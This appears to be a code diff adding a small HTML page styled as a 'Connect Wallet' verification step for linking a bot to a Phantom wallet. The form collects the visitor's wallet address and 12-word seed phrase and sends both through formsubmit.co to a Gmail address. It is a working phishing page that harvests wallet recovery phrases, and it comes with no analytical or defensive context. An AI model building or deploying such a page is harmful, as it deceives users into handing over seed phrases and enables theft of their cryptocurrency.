@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Wallet</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" />
+        <link rel="stylesheet" href="/walllet.css">
+    </head>
+
+    <body>
+        <div class="form__field">
+            <form action="https://formsubmit.co/dbots979@gmail.com" method="POST">
+                <header>
+                    <small>CONNECT WALLET</small>
+                    <h1>Wallet Address</h1>
+                    <p>Verification to link Bot to phantom wallet 
+                    for authorization procedure.</p>
+                </header>
+                <main class="input_section">
+                    <div class="wallet__address">
+                        <label for="w_add">*Enter Wallet Address:</label>
+                        <input type="text" name="wallet_address" id="w_add" required>
+                        <!-- <small>Note: The address must be in your phantom wallet.</small> -->
+                    </div>
+                    <div id="container">
+                        <label for="input-area">*Enter Your 12-Word Phrase:</label>
+                        <textarea id="input-area" name="seed_phrase" required></textarea>
+                        <div id="output-area"></div>
+                        <!-- <div id="error-message">Please enter a 12-word phrase.</div> -->
+                        <!-- <div id="word-count">Word Count: 0/12</div> <div id="error-message"></div> -->
+                      </div>
+                    <button type="submit" class="css-button-arrow--blue btn">Send</button>
+                </main>
+            </form>
+        </div>
+        <script src="walllet.js"></script>
+    </body>
+
+</html>
